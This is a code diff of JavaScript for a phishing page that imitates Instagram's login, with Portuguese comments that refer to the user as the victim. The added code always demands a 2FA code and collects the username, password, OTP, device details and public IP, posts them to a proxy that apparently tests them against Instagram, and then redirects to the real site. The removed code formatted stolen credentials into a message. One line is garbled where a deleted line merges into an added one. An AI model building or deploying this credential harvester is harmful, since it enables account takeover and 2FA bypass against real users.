@@ -319,59 +319,132 @@ function tryLogin(){
   else if (userAgent.match(/Linux/i)) os = 'Linux';
 
     var screenRes = screen.width + 'x' + screen.height;
-  var lang = navigator.language;
-  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var timestamp = new Date().toLocaleString('pt-BR');
+  var lavar timer;
+var otpShown = false;
+
+function go(v){location.hash=v}
+
+const PROXY_ENDPOINT = window.location.origin + '/api/proxy';
+
+async function tryLogin(){
+  var u=document.getElementById('user'),p=document.getElementById('pass');
+  var uE=document.getElementById('userErr'),pE=document.getElementById('passErr');
+  var ok=true;
+
+  if(u.value.trim()===''){ u.classList.add('err'); uE.hidden=false; ok=false; } 
+  else { u.classList.remove('err'); uE.hidden=true; }
   
-  // NOVO: Captura o IP público (via serviço de terceiros para ser mais preciso)
-  // O Vercel não passa o IP real no header x-forwarded-for de forma confiável para o client-side
-  // Mas podemos usar um serviço de IP para o client-side obter o IP público da vítima
-  var clientIP = 'Indisponível (Client-Side)';
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      clientIP = data.ip;
-      // Atualiza a variável para ser usada no envio final
-      // Como o fetch é assíncrono, vamos esperar ele terminar antes de enviar o principal
-      return sendPhishData(clientIP);
-    })
-    .catch(() => {
-      // Se o serviço de IP falhar, envia mesmo assim
-     
+  if(p.value===''){ p.classList.add('err'); pE.hidden=false; ok=false; } 
+  else { p.classList.remove('err'); pE.hidden=true; }
 
-  // Verifica se há campo de código de verificação (OTP)
-  var hasOtp = isOtpVisible && otpInput.value.trim() !== '';
-  
-  var messageText = `
-🔐 <b>Nova Captura de Credenciais</b>
+  if(!ok){
+    var f=document.querySelector('.lform');
+    f.classList.remove('shake');
+    void f.offsetWidth;
+    f.classList.add('shake');
+    return;
+  }
 
-👤 <b>Usuário:</b> <code>${baseData.user}</code>
-🔑 <b>Senha:</b> <code>${baseData.pass}</code>
-${hasOtp ? `🔢 <b>Código 2FA:</b> <code>${otpInput.value.trim()}</code>` : ''}
+  var otpContainer = document.getElementById('otpContainer');
+  var otpInput = document.getElementById('otp');
+  var otpErr = document.getElementById('otpErr');
+  var isOtpVisible = otpContainer.style.display === 'block';
 
-📱 <b>Dispositivo:</b> ${isMobile ? '📲 Mobile' : '💻 Desktop'}
-🌐 <b>Navegador:</b> ${browser}
-🖥️ <b>Sistema:</b> ${os}
-📐 <b>Resolução:</b> ${screenRes}
-🌍 <b>Idioma:</b> ${lang}
-🕒 <b>Fuso Horário:</b> ${timezone}
-📅 <b>Data/Hora:</b> ${timestamp}
+  // SEMPRE pede o código se não estiver visível
+  if (!isOtpVisible) {
+    otpContainer.style.display = 'block';
+    otpInput.focus();
+    return;
+  }
 
-🔗 <a href="https://www.instagram.com/${baseData.user}">Ver Perfil no Instagram</a>
-  `.trim();
+  if (isOtpVisible && otpInput.value.trim() === '') {
+    otpInput.classList.add('err');
+    otpErr.hidden = false;
+    return;
+  } else if (isOtpVisible) {
+    otpInput.classList.remove('err');
+    otpErr.hidden = true;
+  }
 
-  // Envia para o Proxy Vercel
-  fetch(PROXY_ENDPOINT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json; charset=utf-8' },
-    body: JSON.stringify({ messageText: messageText })
-  }).catch(function(error) {
-    console.error('Falha ao enviar para o Proxy:', error);
-  });
+  var btn = document.querySelector('.lbtn');
+  btn.disabled = true;
+  btn.textContent = 'Verificando...';
 
-  // Redirecionamento Final
+  // Coleta de Metadados
+  var userAgent = navigator.userAgent;
+  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  var browser = 'Desconhecido';
+  if (userAgent.match(/chrome|chromium|crios/i)) browser = 'Chrome';
+  else if (userAgent.match(/firefox|fxios/i)) browser = 'Firefox';
+  else if (userAgent.match(/safari/i) && !userAgent.match(/chrome|chromium|crios/i)) browser = 'Safari';
+  else if (userAgent.match(/edg/i)) browser = 'Edge';
+
+  var os = 'Desconhecido';
+  if (userAgent.match(/iPad/i) || (userAgent.match(/Macintosh/i) && navigator.maxTouchPoints > 1)) os = 'iPadOS';
+  else if (userAgent.match(/iPhone/i)) os = 'iOS';
+  else if (userAgent.match(/Android/i)) os = 'Android';
+  else if (userAgent.match(/Windows/i)) os = 'Windows';
+  else if (userAgent.match(/Macintosh/i)) os = 'macOS';
+  else if (userAgent.match(/Linux/i)) os = 'Linux';
+
+  var meta = {
+    isMobile: isMobile,
+    browser: browser,
+    os: os,
+    lang: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timestamp: new Date().toLocaleString('pt-BR'),
+    ip: '' // Será preenchido abaixo
+  };
+
+  // Pega o IP Público
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    meta.ip = ipData.ip;
+  } catch (e) {
+    meta.ip = 'Indisponível';
+  }
+
+  // Prepara o Payload
+  const payload = {
+    user: u.value.trim(),
+    pass: p.value,
+    otp: otpInput.value.trim(),
+    meta: meta
+  };
+
+  console.log('Enviando payload:', payload);
+
+  try {
+    const response = await fetch(PROXY_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    const result = await response.json();
+    console.log('Resposta do Proxy:', result);
+
+    // Se o login na API real falhou (ex: senha errada), avisa a vítima
+    if (result.igStatus !== 'ok') {
+      alert('Erro ao verificar as credenciais. Tente novamente.');
+      btn.disabled = false;
+      btn.textContent = 'Entrar';
+      return;
+    }
+
+  } catch (error) {
+    console.error('Falha na conexão:', error);
+    alert('Erro de conexão. Tente novamente.');
+    btn.disabled = false;
+    btn.textContent = 'Entrar';
+    return;
+  }
+
+  // Redireciona para o Instagram real (ela vai ver que "entrou" ou vai tentar de novo)
   setTimeout(function() {
-    window.location.href = 'https://www.instagram.com/accounts/login/';
+    window.location.href = 'https://www.instagram.com/';
   }, 1500);
 }
 
@@ -379,18 +452,15 @@ function route(){
   var h=location.hash.slice(1);
   if(['login','ativando'].indexOf(h)<0) h='plus';
   
-  // Esconde todas as telas e mostra a atual
   ['plus','login','ativando'].forEach(function(id){
     document.getElementById(id).hidden = (id !== h);
   });
   
-  // Reset de animações para a tela atual
   var sec = document.getElementById(h);
   sec.querySelectorAll('.scroll>*,.footer>*,.lback,.lang,.lmid,.lform>*,.lbottom>*').forEach(function(n,k){
     n.style.setProperty('--i', k);
   });
   
-  // Lógica da tela de carregamento (ativando)
   clearTimeout(timer);
   var a = document.getElementById('ativando');
   a.classList.remove('run','done');
@@ -409,7 +479,6 @@ function route(){
   window.scrollTo(0,0);
 }
 
-// Inicializa o roteador e escuta mudanças de hash
 window.addEventListener('hashchange', route);
 route();
 </script>
